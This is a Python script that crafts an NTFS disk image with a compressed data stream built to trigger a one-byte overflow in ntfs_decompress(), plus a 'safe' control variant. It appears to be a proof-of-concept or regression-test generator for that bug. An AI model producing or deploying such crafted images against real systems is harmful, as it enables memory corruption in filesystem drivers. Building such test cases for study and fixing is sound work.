#!/usr/bin/env python3
"""Craft a minimal NTFS image whose compressed $DATA reaches ntfs_decompress().

Usage: gen_image.py BASE.img OUT.img [safe]
BASE.img is produced by the pinned mkntfs (4 KiB clusters, MFT at LCN 4).
Record 16 gets a non-resident compressed $DATA: one cluster at LCN 1000,
then a 15-cluster hole. The 16th LZNT1 sub-block carries the one-byte
overflow stream; 'safe' drops its two final literal tokens.
"""
import shutil
import struct
import sys

MFT_LCN = 4
REC = 16
DATA_LCN = 1000
CLUSTER = 4096


def crafted_stream(safe=False):
    # 15 compressed sub-blocks with header 0x8000, empty tag stream:
    # ntfs_decompress() zero-fills each 4096-byte destination region.
    out = b"\x00\x80\x00" * 15
    payload = b"\xfe\x41" + b"\x00" * 14              # 1 literal + 7 phrases
    payload += (b"\xff" + b"\x00" * 16) * 169         # 169 * 8 phrases
    if safe:
        payload += b"\x07" + b"\x00" * 6              # 3 phrases into zero-fill
        header = b"\x4f\x8b"                          # 0x8b4f: 2896-byte payload
    else:
        payload += b"\x3f" + b"\x00" * 12 + b"\x5a\x5b"  # 6 phrases + 2 literals
        header = b"\x57\x8b"                          # 0x8b57: 2904-byte payload
    assert len(payload) == (2896 if safe else 2904), len(payload)
    return out + header + payload


def mft_record():
    r = bytearray(1024)
    r[0:4] = b"FILE"
    struct.pack_into("<HHQ", r, 4, 0x30, 3, 0)  # USA offset/count, LSN
    struct.pack_into("<HHHHIIQ", r, 0x10, 1, 1, 0x38, 1, 0xF0, 1024, 0)
    struct.pack_into("<HI", r, 0x28, 2, REC)    # next attr instance, record no.
    # $STANDARD_INFORMATION: resident, FILE_ATTR_COMPRESSED.
    si = 0x38
    struct.pack_into("<IIBBHHHII", r, si, 0x10, 0x60, 0, 0, 0x18, 0, 0, 0x48, 0x18)
    struct.pack_into("<I", r, si + 0x18 + 0x20, 0x00000800)
    # $DATA: non-resident, ATTR_IS_COMPRESSED, 16 clusters, compression unit 4.
    da = 0x98
    struct.pack_into("<IIBBHH", r, da, 0x80, 0x50, 1, 0, 0, 1)
    struct.pack_into("<QQ", r, da + 0x10, 0, 15)
    struct.pack_into("<H", r, da + 0x20, 0x48)
    r[da + 0x22] = 4
    for off in (0x28, 0x30, 0x38, 0x40):
        struct.pack_into("<Q", r, da + off, 65536)
    # One real cluster at LCN 1000, then a 15-cluster hole: sparse run makes
    # ntfs_is_cb_compressed() choose the decompression path.
    r[0xE0:0xE7] = b"\x21\x01\xe8\x03\x01\x0f\x00"
    r[0xE8:0xF0] = b"\xff\xff\xff\xff\x00\x00\x00\x00"
    # Multi-sector transfer fixups for the two 512-byte sectors.
    seq = 1
    struct.pack_into("<H", r, 0x30, seq)
    struct.pack_into("<H", r, 0x32, struct.unpack_from("<H", r, 0x1FE)[0])
    struct.pack_into("<H", r, 0x34, struct.unpack_from("<H", r, 0x3FE)[0])
    struct.pack_into("<H", r, 0x1FE, seq)
    struct.pack_into("<H", r, 0x3FE, seq)
    return r


def main(base, dst, safe=False):
    shutil.copyfile(base, dst)
    with open(dst, "r+b") as f:
        f.seek(MFT_LCN * CLUSTER + REC * 1024)
        f.write(mft_record())
        f.seek(DATA_LCN * CLUSTER)
        f.write(crafted_stream(safe))


if __name__ == "__main__":
    if len(sys.argv) < 3:
        sys.exit("usage: gen_image.py BASE.img OUT.img [safe]")
    main(sys.argv[1], sys.argv[2], len(sys.argv) > 3 and sys.argv[3] == "safe")
